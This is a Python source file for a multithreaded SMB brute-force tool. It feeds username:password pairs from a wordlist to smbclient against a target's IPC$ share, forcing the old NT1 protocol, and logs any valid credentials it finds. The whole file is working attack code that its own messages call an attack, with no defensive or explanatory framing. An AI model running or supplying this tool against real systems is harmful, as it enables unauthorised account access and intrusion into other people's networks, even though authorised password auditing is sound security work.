import subprocess
import queue
import threading
from logger import log_result
from colorama import Fore, Style
import signal
import sys

# Ctrl+C interrupt safe exit
def signal_handler(sig, frame):
    print(Fore.RED + "\n[!] Attack interrupted. Exiting..." + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Login attempt function
def try_login(ip, username, password):
    print(Fore.CYAN + f"[*] Trying: {username}:{password}" + Style.RESET_ALL)
    cmd = ["smbclient", f"//{ip}/IPC$", "-U", f"{username}%{password}", "-m", "NT1"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

# Worker thread function
def worker(ip, combo_queue, result_holder, stop_flag):
    while not combo_queue.empty() and not stop_flag["found"]:
        username, password = combo_queue.get()
        if try_login(ip, username, password):
            print(Fore.GREEN + f"[+] Found Valid Credentials: {username}:{password}" + Style.RESET_ALL)
            log_result(ip, username, password, "Success")
            result_holder.append((username, password))
            stop_flag["found"] = True
        combo_queue.task_done()

# Brute force entry point
def run_brute_force(ip, wordlist_path, threads):
    combo_queue = queue.Queue()
    result_holder = []
    stop_flag = {"found": False}

    with open(wordlist_path, "r", encoding="latin-1") as f:
        for line in f:
            if ":" in line:
                parts = line.strip().split(":", 1)
                if len(parts) == 2:
                    combo_queue.put(parts)

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(ip, combo_queue, result_holder, stop_flag))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    return result_holder[0] if result_holder else None
